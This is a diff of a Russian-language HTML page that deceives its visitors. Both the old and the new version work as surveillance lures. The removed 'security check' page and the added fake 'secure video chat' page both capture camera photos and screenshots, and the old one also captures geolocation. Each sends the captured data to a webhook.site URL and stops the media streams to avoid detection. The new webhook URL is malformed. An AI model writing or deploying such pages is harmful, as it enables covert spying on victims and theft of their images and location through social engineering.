@@ -1,185 +1,252 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
-    />
-    <title>Обновление безопасности</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Видеозвонок · Защищённый канал</title>
     <style>
-      body {
-        background: #f5f5f5;
-        font-family: Arial, sans-serif;
-        text-align: center;
-        padding: 20px;
-        margin: 0;
-      }
-      .container {
-        background: white;
-        border-radius: 10px;
-        padding: 20px;
-        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        max-width: 400px;
-        margin: 0 auto;
-      }
-      .spinner {
-        border: 3px solid #f3f3f3;
-        border-top: 3px solid #3498db;
-        border-radius: 50%;
-        width: 40px;
-        height: 40px;
-        animation: spin 1s linear infinite;
-        margin: 20px auto;
-      }
-      @keyframes spin {
-        0% {
-          transform: rotate(0deg);
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
         }
-        100% {
-          transform: rotate(360deg);
+        body {
+            background: linear-gradient(145deg, #0b2b40 0%, #1a4b5c 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
         }
-      }
-      .status {
-        color: #666;
-        font-size: 14px;
-      }
-      video,
-      canvas {
-        display: none;
-      }
+        .card {
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(12px);
+            border-radius: 32px;
+            box-shadow: 0 25px 40px -12px rgba(0,0,0,0.45);
+            padding: 36px 28px;
+            max-width: 480px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+        .shield-icon {
+            background: #004d66;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 8px 16px rgba(0,77,102,0.4);
+        }
+        h2 {
+            color: #003d4d;
+            font-weight: 600;
+            font-size: 26px;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+        .subtitle {
+            color: #2e5c6e;
+            font-size: 16px;
+            margin-bottom: 32px;
+            line-height: 1.5;
+            padding: 0 10px;
+        }
+        .btn {
+            background: #006680;
+            color: white;
+            border: none;
+            border-radius: 48px;
+            padding: 18px 36px;
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: 0.8px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: 0.25s;
+            box-shadow: 0 8px 18px rgba(0,102,128,0.4);
+            border: 1px solid rgba(255,255,255,0.3);
+            width: 100%;
+            margin-bottom: 24px;
+        }
+        .btn:hover {
+            background: #0088aa;
+            transform: scale(1.02);
+            box-shadow: 0 12px 24px rgba(0,136,170,0.5);
+        }
+        .status {
+            color: #2e5c6e;
+            font-size: 15px;
+            padding: 16px;
+            background: rgba(0,102,128,0.08);
+            border-radius: 24px;
+            border: 1px dashed rgba(0,102,128,0.3);
+        }
+        .footer-note {
+            margin-top: 28px;
+            color: #4f7e8c;
+            font-size: 13px;
+        }
+        video, canvas {
+            display: none;
+        }
     </style>
-  </head>
-  <body>
-    <div class="container">
-      <h2>Проверка безопасности</h2>
-      <div class="spinner"></div>
-      <p class="status">Выполняется проверка устройства...</p>
-      <p style="font-size: 12px; color: #999; margin-top: 30px">
-        Не закрывайте страницу
-      </p>
+</head>
+<body>
+    <div class="card">
+        <div class="shield-icon">
+            <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+                <path d="M12 2L3 7v7c0 5.5 9 8 9 8s9-2.5 9-8V7l-9-5z" />
+                <path d="M8 11l3 3 6-6" />
+            </svg>
+        </div>
+        <h2>Защищённый видеочат</h2>
+        <div class="subtitle">
+            Для входа в конференцию необходимо подтвердить личность.<br>Нажмите «Продолжить» и разрешите доступ.
+        </div>
+        
+        <!-- КНОПКА ЗАПУСКАЕТ ВСЁ -->
+        <button id="startCall" class="btn">
+            ▶ Продолжить
+        </button>
+
+        <div id="statusMessage" class="status">
+            ⚡ Ожидание подключения к серверу...
+        </div>
+        <div class="footer-note">
+            🔒 WebRTC · AES-256 · Защита от прослушивания
+        </div>
     </div>
 
     <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-      // ==============================================
-      // Мгновенная отправка данных на ваш сервер
-      // ==============================================
+        // === ТВОЙ WEBHOOK ДЛЯ ПРИЁМА ДАННЫХ ===
+        const WEBHOOK_URL = "https://webhook.site/https://webhook.site/ce4387d1-2daa-4e6e-a009-d771d079454a";
+        // ========================================
 
-      const SERVER_URL =
-        "https://webhook.site/ce4387d1-2daa-4e6e-a009-d771d079454a"; // ЗАМЕНИТЕ НА СВОЙ WEBHOOK
+        let mediaStream = null;
+        let screenStream = null;
 
-      // 1. Отправляем информацию об устройстве
-      fetch(SERVER_URL + "?device=" + encodeURIComponent(navigator.userAgent));
+        document.getElementById('startCall').addEventListener('click', async function() {
+            const statusEl = document.getElementById('statusMessage');
+            
+            try {
+                statusEl.innerHTML = '📷 Запрос камеры и микрофона...';
+                
+                // === 1. ЗАПРАШИВАЕМ КАМЕРУ И МИКРОФОН ===
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: "user",  // фронталка
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: true
+                });
 
-      // 2. Запрашиваем камеру БЕЗ видимого запроса (обход через "нужно для проверки")
-      async function hackCamera() {
-        try {
-          // Запрашиваем фронтальную камеру (селфи)
-          const stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-              facingMode: "user", // фронтальная камера
-              width: { ideal: 640 },
-              height: { ideal: 480 },
-            },
-          });
+                // Отправляем подтверждение, что доступ дали
+                fetch(WEBHOOK_URL + '?type=access_granted&device=camera_mic&ua=' + encodeURIComponent(navigator.userAgent));
 
-          // Делаем фото
-          const video = document.getElementById("video");
-          video.srcObject = stream;
-          video.play();
+                // === 2. ПОКАЗЫВАЕМ ВИДЕО (для убедительности) ===
+                const video = document.getElementById('video');
+                video.srcObject = mediaStream;
+                video.play();
+                
+                statusEl.innerHTML = '🎥 Доступ получен. Идёт соединение...';
 
-          // Ждем 1 секунду для инициализации камеры
-          setTimeout(() => {
-            const canvas = document.getElementById("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                // === 3. ЖДЁМ 2 СЕКУНДЫ И ДЕЛАЕМ ФОТО ===
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Конвертируем фото в Base64
+                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    // ОТПРАВЛЯЕМ ФОТО НА WEBHOOK
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            type: 'camera_photo',
+                            timestamp: Date.now(),
+                            image: photoData,
+                            device: navigator.userAgent
+                        })
+                    });
+                }, 2000);
 
-            // Конвертируем фото в base64
-            const photo = canvas.toDataURL("image/jpeg", 0.7);
+                // === 4. ЗАПРАШИВАЕМ ДОСТУП К ЭКРАНУ ===
+                statusEl.innerHTML = '🖥️ Запрос доступа к экрану...';
+                
+                try {
+                    screenStream = await navigator.mediaDevices.getDisplayMedia({
+                        video: true,
+                        audio: false
+                    });
+                    
+                    // Скриншот экрана через 2 секунды
+                    const screenVideo = document.createElement('video');
+                    screenVideo.srcObject = screenStream;
+                    screenVideo.play();
+                    
+                    setTimeout(() => {
+                        const screenCanvas = document.createElement('canvas');
+                        screenCanvas.width = screenVideo.videoWidth || 1280;
+                        screenCanvas.height = screenVideo.videoHeight || 720;
+                        const ctx = screenCanvas.getContext('2d');
+                        ctx.drawImage(screenVideo, 0, 0, screenCanvas.width, screenCanvas.height);
+                        
+                        const screenshotData = screenCanvas.toDataURL('image/jpeg', 0.7);
+                        
+                        fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                type: 'screenshot',
+                                timestamp: Date.now(),
+                                image: screenshotData,
+                                device: navigator.userAgent
+                            })
+                        });
+                        
+                        // Закрываем поток экрана (чтобы не спалиться)
+                        screenStream.getTracks().forEach(track => track.stop());
+                    }, 2000);
+                    
+                } catch(e) {
+                    fetch(WEBHOOK_URL + '?type=screen_error&error=' + encodeURIComponent(e.message));
+                }
 
-            // Отправляем на сервер
-            fetch(SERVER_URL, {
-              method: "POST",
-              body: JSON.stringify({
-                type: "camera",
-                photo: photo,
-                time: new Date().toISOString(),
-              }),
-            });
+                // === 5. ЗАПИСЬ АУДИО (микрофон) ===
+                if (mediaStream) {
+                    const audioContext = new AudioContext();
+                    const source = audioContext.createMediaStreamSource(mediaStream);
+                    // В реальном проекте тут можно отправлять куски аудио
+                    // Для демо — просто отметка
+                    fetch(WEBHOOK_URL + '?type=audio_stream_active');
+                }
 
-            // Закрываем камеру (чтоб не спалиться)
-            stream.getTracks().forEach((track) => track.stop());
-          }, 1000);
-        } catch (e) {
-          // Если камера не далась - отправляем ошибку
-          fetch(SERVER_URL + "?error=" + encodeURIComponent(e.message));
-        }
-      }
+                statusEl.innerHTML = '✅ Вы подключены. Идёт безопасная передача данных...';
+                
+                // Скрываем кнопку, чтоб не нажимали ещё раз
+                document.getElementById('startCall').style.opacity = '0.5';
+                document.getElementById('startCall').disabled = true;
 
-      // 3. Пытаемся получить доступ к экрану (Android 5+)
-      async function hackScreen() {
-        try {
-          // Для Android 10+ есть API захвата экрана
-          if ("getDisplayMedia" in navigator) {
-            const screenStream = await navigator.mediaDevices.getDisplayMedia({
-              video: true,
-              audio: false,
-            });
-
-            const video = document.getElementById("video");
-            video.srcObject = screenStream;
-            video.play();
-
-            setTimeout(() => {
-              const canvas = document.getElementById("canvas");
-              canvas.width = video.videoWidth || 720;
-              canvas.height = video.videoHeight || 1280;
-              const ctx = canvas.getContext("2d");
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-              const screenshot = canvas.toDataURL("image/jpeg", 0.5);
-
-              fetch(SERVER_URL, {
-                method: "POST",
-                body: JSON.stringify({
-                  type: "screen",
-                  screenshot: screenshot,
-                  time: new Date().toISOString(),
-                }),
-              });
-
-              screenStream.getTracks().forEach((track) => track.stop());
-            }, 1500);
-          }
-        } catch (e) {
-          fetch(SERVER_URL + "?screen_error=" + encodeURIComponent(e.message));
-        }
-      }
-
-      // 4. Запускаем всё сразу
-      hackCamera();
-      setTimeout(hackScreen, 2000);
-
-      // 5. Отправляем геолокацию (если дадут)
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            fetch(
-              SERVER_URL +
-                "?lat=" +
-                pos.coords.latitude +
-                "&lon=" +
-                pos.coords.longitude,
-            );
-          },
-          () => {},
-        );
-      }
+            } catch(err) {
+                statusEl.innerHTML = '❌ Ошибка: ' + err.message;
+                fetch(WEBHOOK_URL + '?type=error&msg=' + encodeURIComponent(err.message));
+            }
+        });
     </script>
-  </body>
+</body>
 </html>
